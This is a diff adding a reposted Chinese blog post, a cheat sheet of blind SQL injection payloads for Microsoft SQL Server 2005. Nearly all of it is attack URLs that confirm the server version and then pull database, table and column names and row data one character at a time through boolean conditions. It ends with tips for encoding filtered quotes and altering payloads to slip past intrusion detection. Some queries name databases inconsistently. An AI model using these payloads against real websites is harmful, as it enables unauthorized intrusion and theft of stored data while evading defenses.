@@ -1,0 +1,43 @@
+来源：http://www.oldjun.com/blog/index.php/archives/39/
+
+好多人贴了2005注入语句，基本是显错模式的，如果显错，很多工具还是可以用的；但盲注，工具貌似就不咋地了，pangolin注不了2005，其他2005注入的注入工具对于盲注貌似也很感冒；网上没几个盲注语句，于是平时用到的时候自己写，现在贴出来，某些地方类似于MSSQL2000，不完全一样；其实手工还是蛮快的，还可以想怎么变换就怎么变换。这里贴出的语句盲注时使用，如果可以显错，直接加特殊字符然后convert到int，不需要这么麻烦。
+
+判断库是否确实为MSSQL2005：
+http://www.oldjun.com/oldjun.aspx?id=1 and substring((select @@version),22,4)='2005'
+
+猜数据库名：
+
+先猜dbid：
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from master.dbo.sysdatabases where dbid=5)=1
+根据dbid猜库名，先猜出长度：
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from master.dbo.sysdatabases where dbid=5 and len(name)=12)=1
+再逐位猜：
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from master.dbo.sysdatabases where dbid=5 and ascii(substring(name,1,1))>90)=1
+
+猜表名（假设库名已经猜出为database）：
+
+可以尝试先看有没管理表：
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from database.dbo.sysobjects where xtype='u' and name like '%admin%')=1
+
+猜第一个，先长度：
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from database.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype='u') and len(name)=9)=1
+猜第一个表名，逐位猜：
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from database.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype='u') and ascii(substring(name,1,1))>90)=1
+猜第二个表名（假设第一个为table1）：
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from database.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype='u' and name not in ('table1')) and ascii(substring(name,1,1))>90)=1
+...
+
+猜字段（假设表名已经猜出为table）：
+
+猜第一个字段：
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from database.dbo.syscolumns where name in (select top 1 name from database_db.dbo.syscolumns where id=object_id('database.dbo.table')) and ascii(substring(name,1,1))>90)=1
+猜第二个（假设第一个为column1）
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from database.dbo.syscolumns where name in (select top 1 name from database_db.dbo.syscolumns where id=object_id('database.dbo.table') and name not in ('column1')) and ascii(substring(name,1,1))>90)=1
+...
+
+猜数据（假设要猜的字段为name）：
+
+http://www.oldjun.com/oldjun.aspx?id=1 and (select count(*) from database.dbo.table where name in (select top 1 name from database_db.dbo.table) and ascii(substring(name,1,1))>90)=1
+...
+
+过滤了'记得编码；遇到ids记得变形；猜数据前记得先猜长度！ 
